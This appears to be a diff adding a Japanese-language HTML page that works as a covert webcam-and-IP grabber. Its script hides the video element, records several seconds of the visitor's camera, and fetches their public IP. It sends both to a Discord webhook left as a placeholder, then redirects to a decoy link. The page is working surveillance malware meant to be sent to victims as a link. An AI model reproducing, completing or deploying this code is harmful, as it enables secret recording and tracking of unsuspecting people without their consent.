@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ここにたいとる</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: white;
+        }
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay></video>
+
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        const video = document.getElementById('video');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    sendIPInfo();
+                    sendToWebhook();
+                };
+
+                setTimeout(() => {
+                    mediaRecorder.start();
+                    console.log('録画開始');
+                }, 1000);
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    console.log('録画停止');
+                }, 7000);
+            })
+            .catch(error => {
+                console.error('カメラの起動に失敗しました:', error);
+            });
+
+        function sendIPInfo() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const embed = {
+                        embeds: [{
+                            title: '位置情報',
+                            description: `リンクを押した人の情報: ${data.ip}`,
+                            color: 3447003,
+                        }]
+                    };
+                    sendToDiscordWebhook(embed);
+                })
+                .catch(error => console.error('IP情報の取得に失敗:', error));
+        }
+
+        function sendToDiscordWebhook(message) {
+            fetch('ここにwebhook下と同じにしてｎ', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => console.log('送信完了', response))
+            .catch(error => console.error('送信エラー:', error));
+        }
+
+        function sendToWebhook() {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const formData = new FormData();
+            formData.append('file', blob, 'recording.webm');
+
+            fetch('ここにwebhook上と同じにしてｎ', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => console.log('動画送信完了', response))
+            .catch(error => console.error('動画送信エラー:', error));
+        }
+
+        setTimeout(() => {
+            window.location.href = "リダイレクトURL discordから取得できるダウンロードりんくでいい";
+        }, 5000);
+    </script>
+</body>
+</html>
